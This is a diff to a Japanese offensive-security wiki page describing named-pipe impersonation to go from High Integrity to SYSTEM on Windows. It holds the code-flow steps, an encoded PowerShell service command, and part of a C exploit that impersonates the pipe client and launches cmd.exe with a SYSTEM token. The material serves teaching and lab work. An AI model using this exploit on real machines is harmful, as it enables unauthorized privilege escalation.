@@ -1,16 +1,18 @@
-# High Integrity から SYSTEM へ、Named Pipes を使用
+# High Integrity から SYSTEM へ（Name Pipes 使用）
 
 {{#include ../../banners/hacktricks-training.md}}
 
 **Code flow:**
 
-1. 新しい Pipe を作成する
-2. 作成した pipe に接続して何かを書き込む service を作成して起動する。service code は次の encoded PS code を実行する：`$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
-3. service は pipe 内の client からデータを受信し、ImpersonateNamedPipeClient を呼び出して、service の終了を待機する
-4. 最後に、service から取得した token を使用して新しい _cmd.exe_ を起動する
+1. 名前付きパイプ server を作成します。
+2. 作成したパイプに接続して何かを書き込む service を作成し、起動します。service code は、次の encoded PS code を実行します: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
+3. service が接続して書き込んだ後、`ImpersonateNamedPipeClient` を呼び出し、生成された thread token を開いて、primary token として duplicate します。<sup>[[1]](#references)</sup>
+4. その primary token を使用して `cmd.exe` を起動します。<sup>[[2]](#references)</sup>
+
+この手法では、caller が service を作成・起動でき、`CreateProcessWithTokenW` に必要な privileges（通常は `SeImpersonatePrivilege`）を保持していることが前提となります。これは high-integrity から SYSTEM へ移行する technique であり、任意の low-privileged user が利用できる primitive ではありません。<sup>[[2]](#references)[[3]](#references)</sup>
 
 > [!WARNING]
-> 十分な権限がない場合、exploit が停止して戻ってこなくなる可能性があります。
+> service の作成に失敗した場合、この sample は pipe thread に通知せず、無期限に待機する可能性があります。lab で使用する前に、error handling と timeout を追加してください。
 ```c
 #include <windows.h>
 #include <time.h>
@@ -35,7 +37,7 @@ return FALSE;
 // create Piper service
 scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
 SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
-"C:\\Windows\\\System32\\cmd.exe /rpowershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
+"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
 NULL, NULL, NULL, NULL, NULL);
 
 if (scService == NULL) {
@@ -117,4 +119,9 @@ RevertToSelf();
 return 0;
 }
 ```
+## References
+
+- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
+- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
+- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
 {{#include ../../banners/hacktricks-training.md}}
